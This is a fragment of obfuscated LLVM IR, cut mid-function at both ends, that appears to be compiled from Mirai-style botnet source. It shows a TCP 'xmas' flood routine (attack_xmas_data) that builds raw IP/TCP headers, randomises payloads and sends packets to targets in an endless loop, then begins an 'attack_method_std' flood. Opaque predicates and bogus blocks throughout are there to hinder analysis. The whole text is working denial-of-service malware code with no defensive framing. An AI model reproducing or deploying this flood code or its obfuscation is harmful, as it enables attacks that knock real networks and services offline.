  br i1 %665, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %657
  %666 = load i32, i32* @x.23
  %667 = load i32, i32* @y.24
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %674

; <label>:674:                                    ; preds = %originalBBpart2149, %originalBBpart235, %299
  %675 = load i32, i32* @x.23
  %676 = load i32, i32* @y.24
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %674
  %683 = call i64 @time(i64* null) #7
  %684 = load i64, i64* %31, align 8
  %685 = sub nsw i64 %683, %684
  %686 = icmp sgt i64 %685, 10
  %687 = load i32, i32* @x.23
  %688 = load i32, i32* @y.24
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart2155, label %originalBB151alteredBB

originalBBpart2155:                               ; preds = %originalBB151
  br i1 %686, label %695, label %714

; <label>:695:                                    ; preds = %originalBBpart2155
  %696 = load i32, i32* @x.23
  %697 = load i32, i32* @y.24
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %695
  %704 = load i32, i32* %26, align 4
  %705 = call i32 @close(i32 %704)
  %706 = load i32, i32* @x.23
  %707 = load i32, i32* @y.24
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %153

; <label>:714:                                    ; preds = %originalBBpart2155
  br label %271

; <label>:715:                                    ; preds = %498
  br label %716

; <label>:716:                                    ; preds = %715, %originalBBpart212
  %717 = load i32, i32* %9, align 4
  %718 = add nsw i32 %717, 1
  store i32 %718, i32* %9, align 4
  br label %147

; <label>:719:                                    ; preds = %147
  %720 = load i32, i32* @x.23
  %721 = load i32, i32* @y.24
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %719
  %728 = load i32, i32* @x.23
  %729 = load i32, i32* @y.24
  %730 = sub i32 %728, 1
  %731 = mul i32 %728, %730
  %732 = urem i32 %731, 2
  %733 = icmp eq i32 %732, 0
  %734 = icmp slt i32 %729, 10
  %735 = or i1 %733, %734
  br i1 %735, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br label %736

; <label>:736:                                    ; preds = %862, %originalBBpart2163
  store i32 0, i32* %9, align 4
  br label %737

; <label>:737:                                    ; preds = %859, %736
  %738 = load i32, i32* %9, align 4
  %739 = load i8, i8* %5, align 1
  %740 = zext i8 %739 to i32
  %741 = icmp slt i32 %738, %740
  br i1 %741, label %742, label %862

; <label>:742:                                    ; preds = %737
  %743 = load i8**, i8*** %12, align 8
  %744 = load i32, i32* %9, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds i8*, i8** %743, i64 %745
  %747 = load i8*, i8** %746, align 8
  store i8* %747, i8** %39, align 8
  %748 = load i8*, i8** %39, align 8
  %749 = bitcast i8* %748 to %struct.iphdr*
  store %struct.iphdr* %749, %struct.iphdr** %40, align 8
  %750 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %751 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %750, i64 1
  %752 = bitcast %struct.iphdr* %751 to %struct.tcphdr*
  store %struct.tcphdr* %752, %struct.tcphdr** %41, align 8
  %753 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %754 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %753, i64 1
  %755 = bitcast %struct.tcphdr* %754 to i8*
  store i8* %755, i8** %42, align 8
  %756 = load i16, i16* %14, align 2
  %757 = zext i16 %756 to i32
  %758 = icmp eq i32 %757, 65535
  br i1 %758, label %759, label %765

; <label>:759:                                    ; preds = %742
  %760 = call i32 @rand_next()
  %761 = and i32 %760, 65535
  %762 = trunc i32 %761 to i16
  %763 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 3
  store i16 %762, i16* %764, align 4
  br label %765

; <label>:765:                                    ; preds = %759, %742
  %766 = load i8, i8* %25, align 1
  %767 = icmp ne i8 %766, 0
  br i1 %767, label %768, label %787

; <label>:768:                                    ; preds = %765
  %769 = load i32, i32* @x.23
  %770 = load i32, i32* @y.24
  %771 = sub i32 %769, 1
  %772 = mul i32 %769, %771
  %773 = urem i32 %772, 2
  %774 = icmp eq i32 %773, 0
  %775 = icmp slt i32 %770, 10
  %776 = or i1 %774, %775
  br i1 %776, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %768
  %777 = load i8*, i8** %42, align 8
  %778 = load i32, i32* %24, align 4
  call void @rand_str(i8* %777, i32 %778)
  %779 = load i32, i32* @x.23
  %780 = load i32, i32* @y.24
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br label %787

; <label>:787:                                    ; preds = %originalBBpart2167, %765
  %788 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %789 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %788, i32 0, i32 7
  store i16 0, i16* %789, align 2
  %790 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %791 = bitcast %struct.iphdr* %790 to i16*
  %792 = call zeroext i16 @checksum_generic(i16* %791, i32 20)
  %793 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %794 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %793, i32 0, i32 7
  store i16 %792, i16* %794, align 2
  %795 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %796 = load i32, i32* %9, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %795, i64 %797
  %799 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %798, i32 0, i32 1
  %800 = load i32, i32* %799, align 4
  %801 = add i32 %800, 1
  store i32 %801, i32* %799, align 4
  %802 = trunc i32 %800 to i16
  %803 = call zeroext i16 @htons(i16 zeroext %802) #8
  %804 = zext i16 %803 to i32
  %805 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %806 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %805, i32 0, i32 2
  store i32 %804, i32* %806, align 4
  %807 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %808 = load i32, i32* %9, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %807, i64 %809
  %811 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %810, i32 0, i32 2
  %812 = load i32, i32* %811, align 4
  %813 = trunc i32 %812 to i16
  %814 = call zeroext i16 @htons(i16 zeroext %813) #8
  %815 = zext i16 %814 to i32
  %816 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %817 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %816, i32 0, i32 3
  store i32 %815, i32* %817, align 4
  %818 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %819 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %818, i32 0, i32 6
  store i16 0, i16* %819, align 4
  %820 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %821 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %822 = bitcast %struct.tcphdr* %821 to i8*
  %823 = load i32, i32* %24, align 4
  %824 = sext i32 %823 to i64
  %825 = add i64 20, %824
  %826 = trunc i64 %825 to i16
  %827 = call zeroext i16 @htons(i16 zeroext %826) #8
  %828 = load i32, i32* %24, align 4
  %829 = sext i32 %828 to i64
  %830 = add i64 20, %829
  %831 = trunc i64 %830 to i32
  %832 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %820, i8* %822, i16 zeroext %827, i32 %831)
  %833 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %834 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %833, i32 0, i32 6
  store i16 %832, i16* %834, align 4
  %835 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %836 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %835, i32 0, i32 1
  %837 = load i16, i16* %836, align 2
  %838 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %839 = load i32, i32* %9, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %838, i64 %840
  %842 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %841, i32 0, i32 0
  %843 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %842, i32 0, i32 1
  store i16 %837, i16* %843, align 2
  %844 = load i32, i32* %10, align 4
  %845 = load i8*, i8** %39, align 8
  %846 = load i32, i32* %24, align 4
  %847 = sext i32 %846 to i64
  %848 = add i64 40, %847
  %849 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %850 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %851 = load i32, i32* %9, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %850, i64 %852
  %854 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %853, i32 0, i32 0
  %855 = bitcast %struct.sockaddr_in* %854 to %struct.sockaddr*
  store %struct.sockaddr* %855, %struct.sockaddr** %849, align 8
  %856 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %857 = load %struct.sockaddr*, %struct.sockaddr** %856, align 8
  %858 = call i64 @sendto(i32 %844, i8* %845, i64 %848, i32 16384, %struct.sockaddr* %857, i32 16)
  br label %859

; <label>:859:                                    ; preds = %787
  %860 = load i32, i32* %9, align 4
  %861 = add nsw i32 %860, 1
  store i32 %861, i32* %9, align 4
  br label %737

; <label>:862:                                    ; preds = %737
  br label %736

; <label>:863:                                    ; preds = %298, %127, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %105
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %130
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %153
  %864 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %864, i32* %26, align 4
  %865 = icmp eq i32 %864, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %172
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %189
  %866 = load i32, i32* %26, align 4
  %867 = load i32, i32* %26, align 4
  %868 = call i32 (i32, i32, ...) @fcntl(i32 %867, i32 3, i32 0)
  %_ = sub i32 %868, 2048
  %gen = mul i32 %_, 2048
  %_15 = sub i32 %868, 2048
  %gen16 = mul i32 %_15, 2048
  %_17 = sub i32 0, %868
  %gen18 = add i32 %_17, 2048
  %_19 = sub i32 %868, 2048
  %gen20 = mul i32 %_19, 2048
  %_21 = sub i32 %868, 2048
  %gen22 = mul i32 %_21, 2048
  %_23 = sub i32 0, %868
  %gen24 = add i32 %_23, 2048
  %869 = or i32 %868, 2048
  %870 = call i32 (i32, i32, ...) @fcntl(i32 %866, i32 4, i32 %869)
  %871 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %871, align 4
  %872 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %873 = load i32, i32* %9, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %872, i64 %874
  %876 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %875, i32 0, i32 2
  %877 = load i8, i8* %876, align 4
  %878 = zext i8 %877 to i32
  %879 = icmp slt i32 %878, 32
  br label %originalBB14

originalBB29alteredBB:                            ; preds = %originalBB29, %271
  store i32 16, i32* %29, align 4
  %880 = load i32, i32* %10, align 4
  %881 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %882 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %883 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %883, %struct.sockaddr** %882, align 8
  %884 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %885 = load %struct.sockaddr*, %struct.sockaddr** %884, align 8
  %886 = call i64 @recvfrom(i32 %880, i8* %881, i64 256, i32 16384, %struct.sockaddr* %885, i32* %29)
  %887 = trunc i64 %886 to i32
  store i32 %887, i32* %33, align 4
  %888 = load i32, i32* %33, align 4
  %889 = icmp eq i32 %888, -1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %307
  %890 = load i32, i32* %33, align 4
  %891 = sext i32 %890 to i64
  %892 = icmp ugt i64 %891, 40
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %339
  %893 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %894 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %893, i32 0, i32 4
  %895 = load i16, i16* %894, align 4
  %_38 = shl i16 %895, 9
  %_39 = sub i16 %895, 9
  %gen40 = mul i16 %_39, 9
  %_41 = sub i16 0, %895
  %gen42 = add i16 %_41, 9
  %_43 = sub i16 %895, 9
  %gen44 = mul i16 %_43, 9
  %_45 = sub i16 0, %895
  %gen46 = add i16 %_45, 9
  %_47 = shl i16 %895, 9
  %_48 = shl i16 %895, 9
  %896 = lshr i16 %895, 9
  %_49 = shl i16 %896, 1
  %_50 = sub i16 0, %896
  %gen51 = add i16 %_50, 1
  %_52 = sub i16 %896, 1
  %gen53 = mul i16 %_52, 1
  %_54 = sub i16 0, %896
  %gen55 = add i16 %_54, 1
  %_56 = sub i16 0, %896
  %gen57 = add i16 %_56, 1
  %_58 = sub i16 %896, 1
  %gen59 = mul i16 %_58, 1
  %897 = and i16 %896, 1
  %898 = zext i16 %897 to i32
  %899 = icmp ne i32 %898, 0
  br label %originalBB37

originalBB63alteredBB:                            ; preds = %originalBB63, %363
  %900 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %901 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %900, i32 0, i32 4
  %902 = load i16, i16* %901, align 4
  %_64 = shl i16 %902, 12
  %_65 = shl i16 %902, 12
  %_66 = shl i16 %902, 12
  %_67 = sub i16 %902, 12
  %gen68 = mul i16 %_67, 12
  %_69 = shl i16 %902, 12
  %_70 = sub i16 %902, 12
  %gen71 = mul i16 %_70, 12
  %_72 = sub i16 0, %902
  %gen73 = add i16 %_72, 12
  %903 = lshr i16 %902, 12
  %_74 = sub i16 %903, 1
  %gen75 = mul i16 %_74, 1
  %_76 = shl i16 %903, 1
  %_77 = sub i16 %903, 1
  %gen78 = mul i16 %_77, 1
  %_79 = sub i16 0, %903
  %gen80 = add i16 %_79, 1
  %_81 = shl i16 %903, 1
  %_82 = sub i16 0, %903
  %gen83 = add i16 %_82, 1
  %_84 = sub i16 %903, 1
  %gen85 = mul i16 %_84, 1
  %904 = and i16 %903, 1
  %905 = zext i16 %904 to i32
  %906 = icmp ne i32 %905, 0
  br label %originalBB63

originalBB89alteredBB:                            ; preds = %originalBB89, %387
  %907 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %908 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %907, i32 0, i32 0
  %909 = load i32, i32* %908, align 4
  %910 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %911 = load i32, i32* %9, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %910, i64 %912
  %914 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %913, i32 0, i32 0
  store i32 %909, i32* %914, align 4
  %915 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %916 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %915, i32 0, i32 2
  %917 = load i32, i32* %916, align 4
  %918 = call i32 @ntohl(i32 %917) #8
  %919 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %920 = load i32, i32* %9, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %919, i64 %921
  %923 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %922, i32 0, i32 1
  store i32 %918, i32* %923, align 4
  %924 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %925 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %924, i32 0, i32 3
  %926 = load i32, i32* %925, align 4
  %927 = call i32 @ntohl(i32 %926) #8
  %928 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %929 = load i32, i32* %9, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %928, i64 %930
  %932 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %931, i32 0, i32 2
  store i32 %927, i32* %932, align 4
  %933 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %934 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %933, i32 0, i32 1
  %935 = load i16, i16* %934, align 2
  %936 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %937 = load i32, i32* %9, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %936, i64 %938
  %940 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %939, i32 0, i32 3
  store i16 %935, i16* %940, align 4
  %941 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %942 = load i16, i16* %941, align 2
  %943 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %944 = load i32, i32* %9, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %943, i64 %945
  %947 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %946, i32 0, i32 4
  store i16 %942, i16* %947, align 2
  %948 = load i32, i32* %24, align 4
  %949 = sext i32 %948 to i64
  %_90 = sub i64 0, 40
  %gen91 = add i64 %_90, %949
  %_92 = sub i64 0, 40
  %gen93 = add i64 %_92, %949
  %_94 = sub i64 40, %949
  %gen95 = mul i64 %_94, %949
  %_96 = sub i64 40, %949
  %gen97 = mul i64 %_96, %949
  %950 = add i64 40, %949
  %951 = call noalias i8* @malloc(i64 %950) #7
  %952 = load i8**, i8*** %12, align 8
  %953 = load i32, i32* %9, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds i8*, i8** %952, i64 %954
  store i8* %951, i8** %955, align 8
  %956 = load i8**, i8*** %12, align 8
  %957 = load i32, i32* %9, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds i8*, i8** %956, i64 %958
  %960 = load i8*, i8** %959, align 8
  %961 = bitcast i8* %960 to %struct.iphdr*
  store %struct.iphdr* %961, %struct.iphdr** %36, align 8
  %962 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %963 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %962, i64 1
  %964 = bitcast %struct.iphdr* %963 to %struct.tcphdr*
  store %struct.tcphdr* %964, %struct.tcphdr** %37, align 8
  %965 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %966 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %965, i64 1
  %967 = bitcast %struct.tcphdr* %966 to i8*
  store i8* %967, i8** %38, align 8
  %968 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %969 = bitcast %struct.iphdr* %968 to i8*
  %970 = load i8, i8* %969, align 4
  %_98 = sub i8 0, %970
  %gen99 = add i8 %_98, 15
  %_100 = shl i8 %970, 15
  %_101 = sub i8 %970, 15
  %gen102 = mul i8 %_101, 15
  %_103 = shl i8 %970, 15
  %_104 = shl i8 %970, 15
  %_105 = sub i8 %970, 15
  %gen106 = mul i8 %_105, 15
  %_107 = sub i8 %970, 15
  %gen108 = mul i8 %_107, 15
  %_109 = shl i8 %970, 15
  %_110 = shl i8 %970, 15
  %971 = and i8 %970, 15
  %_111 = sub i8 0, %971
  %gen112 = add i8 %_111, 64
  %_113 = shl i8 %971, 64
  %_114 = shl i8 %971, 64
  %_115 = sub i8 0, %971
  %gen116 = add i8 %_115, 64
  %_117 = shl i8 %971, 64
  %_118 = shl i8 %971, 64
  %_119 = sub i8 %971, 64
  %gen120 = mul i8 %_119, 64
  %_121 = sub i8 %971, 64
  %gen122 = mul i8 %_121, 64
  %972 = or i8 %971, 64
  store i8 %972, i8* %969, align 4
  %973 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %974 = bitcast %struct.iphdr* %973 to i8*
  %975 = load i8, i8* %974, align 4
  %_123 = sub i8 0, %975
  %gen124 = add i8 %_123, -16
  %_125 = shl i8 %975, -16
  %_126 = sub i8 0, %975
  %gen127 = add i8 %_126, -16
  %_128 = sub i8 0, %975
  %gen129 = add i8 %_128, -16
  %976 = and i8 %975, -16
  %_130 = sub i8 0, %976
  %gen131 = add i8 %_130, 5
  %_132 = sub i8 0, %976
  %gen133 = add i8 %_132, 5
  %977 = or i8 %976, 5
  store i8 %977, i8* %974, align 4
  %978 = load i8, i8* %13, align 1
  %979 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %980 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %979, i32 0, i32 1
  store i8 %978, i8* %980, align 1
  %981 = load i32, i32* %24, align 4
  %982 = sext i32 %981 to i64
  %_134 = shl i64 40, %982
  %_135 = sub i64 40, %982
  %gen136 = mul i64 %_135, %982
  %_137 = shl i64 40, %982
  %_138 = sub i64 40, %982
  %gen139 = mul i64 %_138, %982
  %983 = add i64 40, %982
  %984 = trunc i64 %983 to i16
  %985 = call zeroext i16 @htons(i16 zeroext %984) #8
  %986 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %987 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %986, i32 0, i32 2
  store i16 %985, i16* %987, align 2
  %988 = load i16, i16* %14, align 2
  %989 = call zeroext i16 @htons(i16 zeroext %988) #8
  %990 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %991 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %990, i32 0, i32 3
  store i16 %989, i16* %991, align 4
  %992 = load i8, i8* %15, align 1
  %993 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %994 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %993, i32 0, i32 5
  store i8 %992, i8* %994, align 4
  %995 = load i8, i8* %16, align 1
  %996 = icmp ne i8 %995, 0
  br label %originalBB89

originalBB143alteredBB:                           ; preds = %originalBB143, %636
  %997 = load i32, i32* %26, align 4
  %998 = call i32 @close(i32 %997)
  br label %originalBB143

originalBB147alteredBB:                           ; preds = %originalBB147, %657
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %674
  %999 = call i64 @time(i64* null) #7
  %1000 = load i64, i64* %31, align 8
  %_152 = sub i64 0, %999
  %gen153 = add i64 %_152, %1000
  %1001 = sub nsw i64 %999, %1000
  %1002 = icmp sgt i64 %1001, 10
  br label %originalBB151

originalBB157alteredBB:                           ; preds = %originalBB157, %695
  %1003 = load i32, i32* %26, align 4
  %1004 = call i32 @close(i32 %1003)
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %719
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %768
  %1005 = load i8*, i8** %42, align 8
  %1006 = load i32, i32* %24, align 4
  call void @rand_str(i8* %1005, i32 %1006)
  br label %originalBB165
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.25
  %6 = load i32, i32* @y.26
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i16, align 2
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca i8*, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %31 = load i8, i8* %13, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #7
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %18, align 8
  %35 = load i8, i8* %13, align 1
  %36 = zext i8 %35 to i64
  %37 = call noalias i8* @calloc(i64 %36, i64 4) #7
  %38 = bitcast i8* %37 to i32*
  store i32* %38, i32** %19, align 8
  %39 = load i8, i8* %15, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 7, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %20, align 2
  %43 = load i8, i8* %15, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 6, i32 65535)
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %21, align 2
  %47 = load i8, i8* %15, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 0, i32 1024)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %22, align 2
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 1, i32 1)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %23, align 1
  %55 = bitcast %struct.sockaddr_in* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 16, i32 4, i1 false)
  %56 = load i16, i16* %21, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  %59 = load i32, i32* @x.25
  %60 = load i32, i32* @y.26
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %70

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %21, align 2
  br label %73

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i16, i16* %21, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %71) #8
  store i16 %72, i16* %21, align 2
  br label %73

